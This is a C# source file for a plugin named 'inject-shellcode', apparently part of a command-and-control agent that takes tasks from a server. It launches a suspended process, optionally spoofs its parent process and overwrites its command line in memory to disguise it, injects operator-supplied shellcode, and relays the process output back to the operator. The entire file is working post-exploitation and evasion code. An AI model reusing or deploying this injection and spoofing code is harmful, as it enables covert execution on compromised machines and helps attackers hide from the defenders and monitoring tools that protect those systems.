using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using Agent.Utilities;
using Agent.Techniques;
using System.Text;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private ITechnique technique { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.technique = new ClassicInjection();
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if(!args.Validate(out var message))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
            Native.PROCESS_INFORMATION pInfo;

            //Spawn Process with or without PPID
            if (!TryCreateProcess(args, out pInfo, out var hStdOutRead, out var hStdOutWrite))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Failed to spawn process",
                    completed = true,
                    status = "error"
                });
            }

            if (!string.IsNullOrEmpty(args.spoofedcommandline))
            {
                TrySpoofCommandLine(args.commandline, pInfo);
            }

            await messageManager.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", job.task.id, false);

            technique.Inject(buf, pInfo.hProcess);

            SafeFileHandle safeStdOutRead = new SafeFileHandle(hStdOutRead, true);
            if (args.output && !safeStdOutRead.IsInvalid)
            {
                Task.Run(() =>
                {
                    GetProcessOutput(safeStdOutRead.DangerousGetHandle(), pInfo, job.task.id);
                    CleanUp(hStdOutRead, hStdOutWrite, pInfo);
                });
            }
            else
            {
                CleanUp(hStdOutRead, hStdOutWrite, pInfo);
            }

        }
        public Native.NTSTATUS TrySpoofCommandLine(string spoofedCmdLine, Native.PROCESS_INFORMATION PROCESS_INFORMATION_instance)
        {
            Native.PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new Native.PROCESS_BASIC_INFORMATION();
            IntPtr ProcessHandle = Native.OpenProcess((uint)Native.ProcessAccessFlags.All, false, PROCESS_INFORMATION_instance.dwProcessId);

            uint sizePtr = 0;

            UInt32 QueryResult = Native.NtQueryInformationProcess(
                ProcessHandle,
                0,
                ref PROCESS_BASIC_INFORMATION_instance,
                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance),
                ref sizePtr
            );

            Native.PEB PEB_instance = new Native.PEB();
            PEB_instance = (Native.PEB)FindObjectAddress(
                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
                PEB_instance,
                ProcessHandle);

            Native.RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS_instance = new Native.RTL_USER_PROCESS_PARAMETERS();
            RTL_USER_PROCESS_PARAMETERS_instance = (Native.RTL_USER_PROCESS_PARAMETERS)FindObjectAddress(
                PEB_instance.ProcessParameters64,
                RTL_USER_PROCESS_PARAMETERS_instance,
                ProcessHandle);

            int cmdLine_Length = 2 * spoofedCmdLine.Length;
            int cmdLine_MaximumLength = 2 * spoofedCmdLine.Length + 2;
            IntPtr real_command_addr = Marshal.StringToHGlobalUni(spoofedCmdLine);

            Native.NTSTATUS ntstatus = new Native.NTSTATUS();
            int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.Length;
            IntPtr com_zeroAddr = Marshal.AllocHGlobal(OriginalCommand_length);
            Native.RtlZeroMemory(com_zeroAddr, OriginalCommand_length);

            // rewrite the memory with 0x00 and then write it with real command
            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                com_zeroAddr,
                (uint)OriginalCommand_length,
                ref sizePtr);

            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                real_command_addr,
                (uint)cmdLine_Length,
                ref sizePtr);

            return ntstatus;
        }
        private Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
        {
            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
            Native.RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));

            uint getsize = 0;
            bool return_status = false;

            return_status = Native.NtReadVirtualMemory(
                Handle,
                BaseAddress,
                ObjAllocMemAddr,
                (uint)Marshal.SizeOf(StructObject),
                ref getsize
                );

            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
            return StructObject;
        }
        private bool TryCreateNamedPipe(ref Native.SECURITY_ATTRIBUTES saHandles, out IntPtr shStdOutRead, out IntPtr shStdOutWrite)
        {
            if (!Native.CreatePipe(out shStdOutRead, out shStdOutWrite, ref saHandles, 0))
            {
                return false;
            }

            if (!Native.SetHandleInformation(shStdOutRead, Native.HANDLE_FLAGS.INHERIT, 0))
            {
                return false;
            }

            return true;
        }
        public bool TryCreateProcess(InjectArgs args, out Native.PROCESS_INFORMATION pi, out IntPtr hStdOutRead, out IntPtr hStdOutWrite)
        {
            //Set Initially
            hStdOutWrite = IntPtr.Zero;
            hStdOutRead = IntPtr.Zero;

            var sInfoEx = new Native.STARTUPINFOEX();

            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            sInfoEx.StartupInfo.dwFlags = 1;

            var saHandles = new Native.SECURITY_ATTRIBUTES()
            {
                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero

            };

            //Add output Redirection
            if (args.output)
            {
                if (!TryCreateNamedPipe(ref saHandles, out hStdOutRead, out hStdOutWrite))
                {
                    pi = new Native.PROCESS_INFORMATION();
                    return false;
                }

                if (hStdOutRead == IntPtr.Zero || hStdOutWrite == IntPtr.Zero)
                {
                    pi = new Native.PROCESS_INFORMATION();
                    return false;
                }

                sInfoEx.StartupInfo.hStdError = hStdOutWrite;
                sInfoEx.StartupInfo.hStdOutput = hStdOutWrite;
            }

            IntPtr lpValue = IntPtr.Zero;
            bool result;

            try
            {
                if (args.parent > 0)
                {
                    var dupStdOut = IntPtr.Zero;
                    var lpValueProc = IntPtr.Zero;
                    if (!AddSpoofParent(args.parent, args.output, ref sInfoEx, ref lpValue, ref hStdOutWrite, ref dupStdOut))
                    {
                        pi= new Native.PROCESS_INFORMATION();
                        return false;
                    }
                }

                sInfoEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
                var pSec = new Native.SECURITY_ATTRIBUTES();
                var tSec = new Native.SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);


                string cmdLine = String.Empty;

                if (string.IsNullOrEmpty(args.spoofedcommandline))
                {
                    cmdLine = args.commandline;
                }
                else
                {
                    cmdLine = args.spoofedcommandline;
                }

                //To do change this to use spoof command line args
                result = Native.CreateProcess(
                    null,
                    cmdLine,
                    pSec,
                    tSec,
                    true,
                    Native.CreateProcessFlags.CREATE_SUSPENDED |
                    Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
                    Native.CreateProcessFlags.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref sInfoEx,
                    out pi
                );

            }
            catch
            {
                pi = new Native.PROCESS_INFORMATION();
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Native.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);
                return false;
            }
            if (sInfoEx.lpAttributeList != IntPtr.Zero)
            {
                Native.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);
            return result;
        }
        private bool GetProcessOutput(IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, string task_id)
        {
            using (var cts = new CancellationTokenSource())
            using (SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false))
            using (var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true))
            {
                StringBuilder outputBuilder = new StringBuilder();
                //char[] buf = new char[4096];

                while (!cts.Token.IsCancellationRequested) // Loop to handle process output
                {
                    if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) // If the process closed, tell the loop to stop
                    {
                        cts.Cancel();
                    }

                    uint bytesToRead = 0;
                    if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) // Check if we have bytes to read
                    {
                        if (bytesToRead == 0) // We don't have any bytes to read
                        {
                            if (cts.Token.IsCancellationRequested) // Check if we're supposed to exit
                            {
                                break;
                            }
                            else // Process just hasn't written anything yet
                            {
                                continue;
                            }
                        }
                        else if (bytesToRead > 4096) // Limit the buffer size to 4096 to not overwhelm the agent
                        {
                            bytesToRead = 4096;
                        }

                        try
                        {
                            char[] buf = new char[bytesToRead];
                            int bytesRead = reader.Read(buf, 0, (int)bytesToRead); // Read the char buffer into our previously allocated array

                            if (bytesRead > 0) // We read some bytes, let's append it to the StringBuilder
                            {
                                messageManager.Write(new string(buf), task_id, false);
                            }
                        }
                        catch (IOException ex)
                        {
                            // Handle IOException, if needed
                            Console.WriteLine($"Error reading from process output: {ex.Message}");
                        }
                    }
                }
            }

            return true;
        }
        private void CleanUp(IntPtr hStdOutRead, IntPtr hStdOutWrite, Native.PROCESS_INFORMATION pInfo)
        {
            if (hStdOutRead != IntPtr.Zero)
            {
                Native.CloseHandle(hStdOutRead);
            }

            if (hStdOutWrite != IntPtr.Zero)
            {
                Native.CloseHandle(hStdOutWrite);
            }

            if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
            {
                Native.CloseHandle(pInfo.hProcess);
            }

            if (pInfo.hThread != IntPtr.Zero)
            {
                Native.CloseHandle(pInfo.hThread);
            }
        }
        private bool AddSpoofParent(int parentProcessId, bool output, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
        {
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpValueProc);
            if (success || lpValueProc == IntPtr.Zero)
            {
                return false;
            }

            siEx.lpAttributeList = Marshal.AllocHGlobal(lpValueProc);
            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpValueProc);
            if (!success)
            {
                return false;
            }


            //Get a handle to the parent process
            IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);

            // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

            Marshal.WriteIntPtr(lpValueProc, parentHandle);

            //Updates the parent process ID
            success = Native.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValueProc,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (!success)
            {
                return false;
            }

            if (output)
            {
                IntPtr hCurrent = Process.GetCurrentProcess().Handle;
                IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);

                success = Native.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS);

                if (!success)
                {
                    return false;
                }

                //The old handle would get overwritten if we're process spoofing, so we apply our backup handle here
                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
            }

            return true;
        }

    }
}
